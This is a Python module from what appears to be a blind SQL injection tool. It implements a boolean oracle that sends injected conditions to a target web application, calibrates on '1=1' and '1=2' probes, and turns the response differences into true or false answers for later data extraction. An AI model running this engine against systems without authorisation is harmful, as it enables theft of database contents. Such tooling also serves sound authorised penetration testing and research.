"""Boolean oracle.

Answers a single SQL boolean question by: building a payload, sending it,
classifying the response, and mapping ERROR->FALSE, OK->TRUE. Ambiguous or
failed requests are retried; if still undecided they are reported as
UNKNOWN/REQUEST_ERROR/TIMEOUT and never silently coerced to FALSE.

The oracle can also *calibrate* itself: by asking a tautology (1=1) and a
contradiction (1=2) it obtains a known-OK and known-ERROR response and builds a
BaselineClassifier automatically. That is how the tool "inspects the target's
behaviour" before extraction without hard-coding the error format.
"""

from __future__ import annotations

import threading
import time
from typing import Optional

from .classifier import BaseClassifier, BaselineClassifier, from_config
from .config import Config
from .http_client import HttpClient, RequestError, TimeoutError_
from .logging_util import Logger
from .payload import PayloadBuilder
from .result_types import (
    HttpResponse,
    OracleObservation,
    OracleResult,
    Verdict,
)


class CalibrationError(Exception):
    pass


class BooleanOracle:
    def __init__(
        self,
        config: Config,
        http: Optional[HttpClient] = None,
        classifier: Optional[BaseClassifier] = None,
        logger: Optional[Logger] = None,
    ) -> None:
        self.config = config
        self.logger = logger or Logger(config.verbosity)
        self.http = http or HttpClient(config, self.logger)
        self.payload = PayloadBuilder(config.base_payload)
        # An explicitly-configured classifier takes precedence; otherwise we
        # calibrate lazily on first use (or when calibrate() is called).
        self.classifier = classifier or from_config(config.classifier)
        # counters (guarded because ask() runs under the worker pool)
        self.requests_completed = 0
        self.requests_failed = 0
        self._counter_lock = threading.Lock()

    def _count(self, completed: int = 0, failed: int = 0) -> None:
        with self._counter_lock:
            self.requests_completed += completed
            self.requests_failed += failed

    # ------------------------------------------------------------------ calib
    def calibrate(self) -> None:
        """Learn OK/ERROR fingerprints from a true and a false probe."""
        self.logger.info("Calibrating classifier from known-true/known-false probes...")
        ok_resp = self._raw("1=1")
        err_resp = self._raw("1=2")
        if ok_resp is None or err_resp is None:
            raise CalibrationError("calibration probes failed to reach the target")
        if (
            ok_resp.status == err_resp.status
            and ok_resp.length == err_resp.length
            and ok_resp.body == err_resp.body
        ):
            raise CalibrationError(
                "known-true and known-false responses are identical; the base "
                "payload or injection point is probably wrong (no observable side "
                "channel). Inspect the target and adjust base_payload / param."
            )
        self.classifier = BaselineClassifier(
            ok=ok_resp, error=err_resp, length_tolerance=self.config.classifier.length_tolerance
        )
        self.logger.info(
            f"Calibrated: OK(status={ok_resp.status},len={ok_resp.length}) "
            f"ERROR(status={err_resp.status},len={err_resp.length})"
        )

    def ensure_classifier(self) -> None:
        if self.classifier is None:
            if self.config.classifier.auto_calibrate:
                self.calibrate()
            else:
                raise CalibrationError(
                    "no classifier configured and auto_calibrate is disabled"
                )

    # ------------------------------------------------------------------- ask
    def _raw(self, condition: str) -> Optional[HttpResponse]:
        value = self.payload.build(condition)
        try:
            resp = self.http.send(value)
            self._count(completed=1)
            return resp
        except (TimeoutError_, RequestError) as exc:
            self._count(failed=1)
            self.logger.debug(f"raw request failed for [{condition}]: {exc}")
            return None

    def ask(self, condition: str) -> OracleObservation:
        """Ask one boolean question, with retries for ambiguity/failure."""
        self.ensure_classifier()
        assert self.classifier is not None

        attempts = 0
        last_error: Optional[str] = None
        max_attempts = 1 + max(self.config.ambiguous_retries, 0)
        backoff = self.config.retry_backoff

        while attempts < max_attempts:
            attempts += 1
            value = self.payload.build(condition)
            try:
                resp = self.http.send(value)
                self._count(completed=1)
            except TimeoutError_ as exc:
                self._count(failed=1)
                last_error = f"timeout: {exc}"
                self.logger.debug(f"ask[{condition}] attempt {attempts} timeout")
                time.sleep(backoff)
                backoff *= 2
                # a persistent timeout may itself be the signal, but we do not
                # assume so — report TIMEOUT if it never resolves.
                if attempts >= max_attempts:
                    return OracleObservation(condition, OracleResult.TIMEOUT, attempts, error=last_error)
                continue
            except RequestError as exc:
                self._count(failed=1)
                last_error = f"request error: {exc}"
                self.logger.debug(f"ask[{condition}] attempt {attempts} request error")
                time.sleep(backoff)
                backoff *= 2
                if attempts >= max_attempts:
                    return OracleObservation(condition, OracleResult.REQUEST_ERROR, attempts, error=last_error)
                continue

            decision = self.classifier.classify(resp)
            self.logger.debug(
                f"ask[{condition}] attempt {attempts} -> {decision.verdict.value}: {decision.reason}"
            )
            if decision.verdict is Verdict.OK:
                return OracleObservation(condition, OracleResult.TRUE, attempts, decision, resp)
            if decision.verdict is Verdict.ERROR:
                return OracleObservation(condition, OracleResult.FALSE, attempts, decision, resp)

            # UNKNOWN: retry a couple of times before giving up.
            last_error = decision.reason
            if attempts < max_attempts:
                time.sleep(backoff)
                backoff *= 2

        return OracleObservation(condition, OracleResult.UNKNOWN, attempts, error=last_error)

    def test(self, condition: str) -> OracleResult:
        """Convenience: just the result enum."""
        return self.ask(condition).result
